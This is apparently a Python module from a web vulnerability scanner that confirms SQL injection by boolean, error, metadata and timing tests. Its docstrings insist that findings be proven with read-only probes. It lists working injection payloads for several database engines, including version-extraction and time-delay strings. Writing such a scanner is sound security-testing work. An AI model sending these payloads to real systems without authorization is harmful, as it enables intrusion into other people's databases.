"""
SQL injection, confirmed rather than suspected.

Three techniques, tried in the order of how much they prove:

  1. **Boolean** — the strongest. ``x' AND '1'='1`` returns the original page,
     ``x' AND '1'='2`` does not. The application evaluated a condition we
     wrote, which no amount of input filtering or error handling can fake. Two
     different payload pairs have to agree before it is reported, and both
     quoting styles are tried because an integer parameter and a string one
     break differently.

  2. **Error** — a database error message naming the engine. Excellent
     evidence in a report, but on its own it only proves the input reached the
     parser, so it is reported at lower confidence unless boolean or timing
     agrees.

  3. **Metadata** — once a boolean or error channel exists, one short,
     read-only expression that makes the database name itself: its version
     string, the current database, the current user. This is the strongest
     evidence there is, because the response contains something only the
     database could have produced. Nothing is enumerated beyond those three
     values; the goal is to prove the vulnerability and stop.

  4. **Timing** — for the blind case where nothing about the response changes.
     A LEAD, NOT A FINDING. It is never on its own enough to confirm, however
     cleanly the delay scales, because an application that is slow, loaded,
     locked, or behind a proxy produces the same curve. A real report of
     "CONFIRMED CRITICAL SQL injection" against a baseline of 3.43s and a
     "five second" payload that added 1.16s is what this rule exists to stop.
     When timing fires, the check tries to turn it into one of the three
     above; if it cannot, the finding is Potential and says why.

Payloads are appended to the real value rather than replacing it, because a
query that finds no row cannot demonstrate a difference between true and
false.
"""

from __future__ import annotations

import re

from command_bridge.modules.scanner.model import Evidence, ScanFinding, \
    response_summary, step
from command_bridge.modules.scanner import oracles, grading

#: Read-only expressions that make the database identify itself inside an
#: error message. One request each, no enumeration, nothing written. The
#: value they return is the proof: no amount of coincidence puts a
#: PostgreSQL version string in a response because a page was slow.
METADATA_PROBES = (
    ("Microsoft SQL Server", "' AND 1=CONVERT(int,@@version)--",
     r"(Microsoft SQL Server[^\n'\"]{0,120})"),
    ("Microsoft SQL Server", "' AND 1=CONVERT(int,DB_NAME())--",
     r"converting the nvarchar value '([^']{1,80})'"),
    ("MySQL", "' AND EXTRACTVALUE(1,CONCAT(0x5c,VERSION()))--",
     r"XPATH syntax error: '\\?([^']{1,80})'"),
    ("MySQL", "' AND EXTRACTVALUE(1,CONCAT(0x5c,DATABASE()))--",
     r"XPATH syntax error: '\\?([^']{1,80})'"),
    ("PostgreSQL", "' AND 1=CAST(version() AS int)--",
     r"invalid input syntax for (?:type )?integer: \"([^\"]{1,120})\""),
    ("PostgreSQL", "' AND 1=CAST(current_database() AS int)--",
     r"invalid input syntax for (?:type )?integer: \"([^\"]{1,80})\""),
    ("Oracle", "' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--",
     r"ORA-\d{5}[^\n]{0,160}"),
    ("SQLite", "' AND 1=load_extension(sqlite_version())--",
     r"(sqlite_version|no such function: load_extension)[^\n]{0,80}"),
)

#: (true, false) pairs. Ordered so the most commonly effective quoting is
#: tried first; confirmation needs two of them to agree.
#: Several members per syntax family on purpose. Confirmation requires two
#: agreeing pairs, and a numeric parameter only responds to the numeric
#: family — with one member each, a real integer injection could never reach
#: two agreements and was demoted to a tentative error-message finding.
BOOLEAN_PAIRS = (
    # numeric
    (" AND 1=1", " AND 1=2"),
    (" AND 5=5", " AND 5=6"),
    (" AND 9>1", " AND 9<1"),
    # single-quoted string
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 'ab'='ab", "' AND 'ab'='cd"),
    ("' AND 1=1-- ", "' AND 1=2-- "),
    # double-quoted string
    ('" AND "1"="1', '" AND "1"="2'),
    ('" AND 1=1-- ', '" AND 1=2-- '),
    # bracketed
    (") AND (1=1", ") AND (1=2"),
    ("') AND ('1'='1", "') AND ('1'='2"),
)

#: Characters that make a parser complain when they land unescaped.
ERROR_PROBES = ("'", "\"", "')", "\\", "';")

#: One per engine — the scanner does not know which it is talking to, and a
#: payload for the wrong one simply does nothing.
TIME_TEMPLATES = (
    ("MySQL / MariaDB", "' AND SLEEP({d})-- "),
    ("MySQL / MariaDB", " AND SLEEP({d})"),
    ("PostgreSQL", "'||(SELECT pg_sleep({d}))||'"),
    ("PostgreSQL", "; SELECT pg_sleep({d})-- "),
    ("Microsoft SQL Server", "'; WAITFOR DELAY '0:0:{d}'-- "),
    ("Microsoft SQL Server", "); WAITFOR DELAY '0:0:{d}'-- "),
    ("Oracle", "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{d})-- "),
)


class SqlInjectionCheck:
    key = "sqli"
    name = "SQL injection"
    issue = "sqli"

    def applies(self, point, profile):
        return True

    def run(self, ctx, point, baseline):
        findings = []

        boolean = self._boolean(ctx, point, baseline)
        error = self._error(ctx, point)
        timing = None
        if not boolean and ctx.profile.timing_checks:
            timing = self._timing(ctx, point, baseline)

        # Metadata is attempted only once another channel suggests the
        # value reaches a query, so a clean endpoint is never sent eight
        # extra payloads.
        metadata = None
        if boolean or error or timing:
            metadata = self._metadata(ctx, point, baseline)

        if not (boolean or error or timing or metadata):
            return findings

        finding = ScanFinding(issue=self.issue, where=point.request.url,
                              point=point.label(),
                              method=point.request.method,
                              auth_context=grading.auth_context(ctx))
        evidence, notes = [], []

        if metadata:
            engine, value, probe, request, response = metadata
            notes.append(
                f"The application returned a value that only the database "
                f"could have produced: {value!r}, from {engine}.")
            finding.add(grading.Signal(
                grading.DATA,
                f"A read-only expression made the database return {value!r} "
                f"({engine}). Nothing but a query reaching the database "
                f"produces that string.",
                {"engine": engine, "value": value, "payload": probe}))
            evidence.append(step(
                f"{engine} returned {value}", request, response,
                auth=ctx.auth, payload=probe, decisive=True,
                note=f"Database-derived value: {value}", body_limit=300))

        if boolean:
            notes.append("The application evaluated a condition supplied in "
                         "this parameter: the true form returned the original "
                         "page and the false form did not.")
            finding.add(grading.Signal(
                grading.DIFFERENTIAL,
                f"A condition written into this parameter was evaluated: the "
                f"TRUE form returned the original page and the FALSE form did "
                f"not, across {len(boolean)} independent payload pair(s).",
                {"pairs": len(boolean),
                 "similarity": boolean[0].get("pair_similarity")},
                # confirm() only returns pairs that agreed with each other,
                # so reaching here means it was reproduced.
                reproduced=len(boolean) >= 2))
            for result in boolean[:2]:
                evidence.append(step(
                    "Condition true — page returned as normal",
                    result["true_request"], result["true_response"],
                    auth=ctx.auth, payload=result["true_payload"],
                    decisive=not metadata))
                evidence.append(step(
                    "Condition false — page changed",
                    result["false_request"], result["false_response"],
                    auth=ctx.auth, payload=result["false_payload"],
                    note=f"similarity between the two responses: "
                         f"{result['pair_similarity']}"))

        if error:
            engine, excerpt, request, response, probe = error
            notes.append(f"The {engine} parser reported a syntax error when "
                         f"the value was modified.")
            finding.add(grading.Signal(
                grading.ERROR,
                f"Modifying the value produced a {engine} error that the "
                f"unmodified request does not produce, so the value reaches a "
                f"query.",
                {"engine": engine, "excerpt": excerpt[:200],
                 "payload": probe}))
            evidence.append(step(
                f"{engine} error", request, response, auth=ctx.auth,
                payload=probe, note=excerpt, body_limit=300,
                decisive=not (metadata or boolean)))

        if timing:
            # Recorded, and deliberately not enough. The numbers go in
            # measurements so the raw-detection block can show exactly what
            # was observed without the prose implying more than it proves.
            finding.measurements.update({
                "baseline_median_s": timing["baseline_median"],
                "baseline_ceiling_s": timing["baseline_ceiling"],
                "short_delay_s": timing["short_delay"],
                "short_time_s": timing["short_time"],
                "long_delay_s": timing["long_delay"],
                "long_time_s": timing["long_time"],
                "control_time_s": timing.get("control_time"),
            })
            margin = round(timing["short_time"] - timing["baseline_median"], 2)
            notes.append(
                f"The response time tracked the delay requested in the "
                f"payload: {timing['short_delay']}s produced "
                f"{timing['short_time']}s and {timing['long_delay']}s produced "
                f"{timing['long_time']}s, against a normal response time of "
                f"{timing['baseline_median']}s.")
            finding.add(grading.Signal(
                grading.TIMING,
                f"Asking for {timing['short_delay']}s took "
                f"{timing['short_time']}s and asking for "
                f"{timing['long_delay']}s took {timing['long_time']}s, "
                f"against a baseline of {timing['baseline_median']}s — a "
                f"margin of {margin}s on the shorter payload.",
                dict(finding.measurements)))
            evidence.append(step(
                f"Delay {timing['short_delay']}s → {timing['short_time']}s",
                timing["short_request"], auth=ctx.auth,
                payload=timing.get("short_payload", "")))
            evidence.append(step(
                f"Delay {timing['long_delay']}s → {timing['long_time']}s",
                timing["long_request"], timing.get("response"),
                auth=ctx.auth, payload=timing.get("long_payload", ""),
                decisive=not (metadata or boolean or error),
                note=f"This endpoint never took longer than "
                     f"{timing['baseline_ceiling']}s when left alone. A "
                     f"delay is a lead, not proof."))

        finding.evidence = evidence
        finding.detail_extra = " ".join(notes)
        finding.settle()
        findings.append(finding)
        return findings

    # ── techniques ───────────────────────────────────────────────────────
    def _boolean(self, ctx, point, baseline):
        differential = oracles.Differential(ctx.auth, baseline)
        return differential.confirm(point, BOOLEAN_PAIRS, mode="append")

    def _error(self, ctx, point):
        for probe in ERROR_PROBES:
            request = point.build(probe, mode="append")
            response = ctx.auth.send(request)
            if response is None:
                continue
            engine, excerpt = oracles.database_error(response.text)
            if engine:
                return engine, excerpt, request, response, probe
        return None

    def _metadata(self, ctx, point, baseline):
        """Make the database name itself, in one request per probe.

        This is what turns a suspicion into something a client cannot argue
        with: the response contains the database's own version string, or the
        name of the schema it is running in. It is also the smallest possible
        proof — three values, read-only, no table enumeration and nothing
        written. "Prove it and stop" is the rule; dumping rows to make a point
        is someone else's job and not a scanner's.
        """
        baseline_body = getattr(baseline, "body", "") or ""
        for engine, probe, pattern in METADATA_PROBES:
            request = point.build(probe, mode="append")
            response = ctx.auth.send(request)
            if response is None:
                continue
            body = response.text or ""
            match = re.search(pattern, body, re.I)
            if not match:
                continue
            value = (match.group(1) if match.groups() else match.group(0))
            value = " ".join(value.split())[:120]
            if not value or value in baseline_body:
                continue           # the page already said this
            return engine, value, probe, request, response
        return None

    def _timing(self, ctx, point, baseline):
        timing = oracles.Timing(ctx.auth, baseline, ctx.profile.delay_seconds)
        for _engine, template in TIME_TEMPLATES:
            result = timing.test(point, template, mode="append")
            if result:
                return result
        return None
